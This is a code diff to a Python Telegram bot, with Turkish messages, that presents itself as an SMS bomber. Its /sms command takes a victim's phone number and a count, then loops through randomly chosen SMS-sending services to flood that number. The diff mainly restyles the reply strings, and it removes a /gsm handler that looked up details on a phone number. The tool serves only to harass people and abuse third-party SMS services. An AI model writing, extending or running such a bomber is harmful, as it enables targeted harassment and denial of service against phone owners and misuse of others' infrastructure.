@@ -1600,40 +1600,31 @@ bot = telebot.TeleBot(TOKEN)
 
 @bot.message_handler(commands=['start'])
 def botu_baslatma(message):
-    bot.reply_to(message, "MERHABA SMS BOMBER BOTUNA HOŞGELDİNİZ, KOMUTLAR İÇİN /komut 𝑌𝑎𝑝ı𝑛.")
+    bot.reply_to(message, "𝐌𝐄𝐑𝐇𝐀𝐁𝐀 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 𝐁𝐎𝐓𝐔𝐍𝐀 𝐇𝐎Ş𝐆𝐄𝐋𝐃İ𝐍İ𝐙, 𝐊𝐎𝐌𝐔𝐓𝐋𝐀𝐑 İÇİ𝐍 /𝐤𝐨𝐦𝐮𝐭.")
 
 @bot.message_handler(commands=['komut'])
 def send_help_message(message):
     bot.reply_to(message, """
-/sms 𝑖𝑙𝑒 𝑆𝑀𝑆 𝑆𝑝𝑎𝑚 𝑌𝑎𝑝𝑎𝑏𝑖𝑙𝑖𝑟𝑠𝑖𝑛𝑖𝑧.
+/sms - Sms Spam İşlemi.
     """)
 
-
-@bot.message_handler(commands=['gsm'])
-def handle_gsm(message):
-    try:
-        gsm_numarasi = message.text.split()[1]
-        gsm_bilgi = gsm_sorgula(gsm_numarasi)
-        bot.reply_to(message, gsm_bilgi)
-    except Exception as e:
-        bot.reply_to(message, f"𝐵𝑖𝑟 𝑇𝑒𝑙𝑒𝑓𝑜𝑛 𝑁𝑢𝑚𝑎𝑟𝑎𝑠ı 𝐺𝑖𝑟𝑚𝑒𝑙𝑖𝑠𝑖𝑛.")
 
 @bot.message_handler(commands=['sms'])
 def send_sms(message):
     args = message.text.split()[1:]
     if len(args) != 2:
-        bot.reply_to(message, "/sms 544909xx 250")
+        bot.reply_to(message, "𝗞𝘂𝗹𝗹𝗮𝗻ı𝗺:\n\n/sms 𝟓𝟒𝟒𝟗𝟎𝟗𝐱𝐱 𝟐𝟓𝟎")
         return
     phone_number = args[0]
     sms_count = int(args[1])
 
-    bot.reply_to(message, f"𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝐵𝑎𝑠̧𝑙𝑎𝑑ı. 𝐵𝑖𝑡𝑡𝑖𝑔̆𝑖𝑛𝑑𝑒 𝐵𝑖𝑙𝑑𝑖𝑟𝑖𝑙𝑒𝑐𝑒𝑘!")
+    bot.reply_to(message, f"İŞLEM BAŞLATILDI!")
 
     for _ in range(sms_count):
         servis_adi = random.choice(list(services.keys()))
         service = services[servis_adi]
         service(phone_number)
 
-    bot.reply_to(message, f"{sms_count} 𝑎𝑑𝑒𝑡 𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝑡𝑎𝑚𝑎𝑚𝑙𝑎𝑛𝑑ı.")
+    bot.reply_to(message, f"{sms_count} İSLEM TAMAMDIR ✓")
 
 bot.polling()
